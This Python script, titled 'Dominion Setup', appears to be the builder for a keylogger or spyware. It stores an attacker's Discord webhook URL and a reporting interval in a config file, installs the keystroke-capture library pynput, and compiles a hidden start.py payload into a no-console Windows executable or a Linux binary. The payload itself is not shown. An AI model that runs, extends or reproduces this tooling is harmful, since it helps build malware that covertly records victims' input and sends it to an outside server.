#!/usr/bin/env python3

import os
import sys
import subprocess
import argparse
from shutil import which



def check_installed(program):
    return which(program) is not None

def install_linux_pyinstaller():
    print("[+] Installing PyInstaller + requirements for Linux...")
    subprocess.run(["sudo", "apt", "update"])
    subprocess.run(["sudo", "apt", "install", "-y", "python3-pip"])
    subprocess.run(["pip3", "install", "--upgrade", "pip"])
    subprocess.run(["pip3", "install", "pyinstaller", "pynput", "thread6", "requests"])



def find_wine_python311():
    possible_paths = [
        "C:\\Python311\\python.exe",
        "C:\\Users\\root\\AppData\\Local\\Programs\\Python\\Python311\\python.exe",
        "C:\\Program Files\\Python311\\python.exe",
        "C:\\Program Files (x86)\\Python311\\python.exe"
    ]
    for path in possible_paths:
        result = subprocess.run(["wine", path, "--version"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            return path
    return None



def main():
    parser = argparse.ArgumentParser(description="Dominion Setup")
    parser.add_argument("--webhook", required=True, help="Discord webhook URL")
    parser.add_argument("--interval", required=False, type=int, default=60, help="Reporting interval (sec)")
    parser.add_argument("--windows", action="store_true", help="Build Windows EXE with Wine Python 3.11")
    parser.add_argument("--linux", action="store_true", help="Build Linux binary")

    args = parser.parse_args()

    with open("config.py", "w") as f:
        f.write(f'WEBHOOK_URL = "{args.webhook}"\n')
        f.write(f'INTERVAL = {args.interval}\n')

    print(f"[+] Saved config: webhook + interval {args.interval} sec")

    if not args.windows and not args.linux:
        print("[-] Please specify --windows or --linux")
        sys.exit(1)



    if args.windows:
        print("[+] Target: Windows")

        if not check_installed("wine"):
            print("[-] Wine is not installed. Please install it first.")
            sys.exit(1)

        python_installed = False

        while not python_installed:
            wine_python = find_wine_python311()

            if wine_python:
                print(f"[+] Found Python in Wine: {wine_python}")
                python_installed = True
            else:
                print("[!] Python 3.11 not found inside Wine.")
                if os.path.exists("python311.exe"):
                    print("[+] Found local python311.exe, using it.")
                else:
                    print("[+] Downloading Python 3.11 installer...")
                    subprocess.run(["wget", "https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe", "-O", "python311.exe"])

                print("[+] Starting Python installer inside Wine...")
                subprocess.Popen(["wine", "python311.exe"]).wait()
                input("[!] Please complete the installer wizard fully, then press Enter to re-check...")


        
        print("[+] Checking & Installing required Python packages...")
        subprocess.run(['wine', wine_python, "-m", "pip", "install", "--upgrade", "pip"])
        subprocess.run(['wine', wine_python, "-m", "pip", "install", "pyinstaller", "pynput", "thread6", "requests"])

        print("[+] Building Windows EXE...")
        subprocess.run(["wine", wine_python, "-m", "PyInstaller", "--onefile", "--clean", "--noconsole", "start.py"])




    if args.linux:
        print("[+] Target: Linux")

        if not check_installed("pyinstaller"):
            print("[-] PyInstaller not found. Installing now...")
            install_linux_pyinstaller()
        else:
            subprocess.run(["pip3", "install", "pynput", "thread6", "requests", "--break-system-packages"])

        print("[+] Building Linux binary...")
        subprocess.run(["pyinstaller", "--onefile", "start.py"])

    print("[+] All done! Check /dist/ for your output.")



if __name__ == "__main__":
    main()
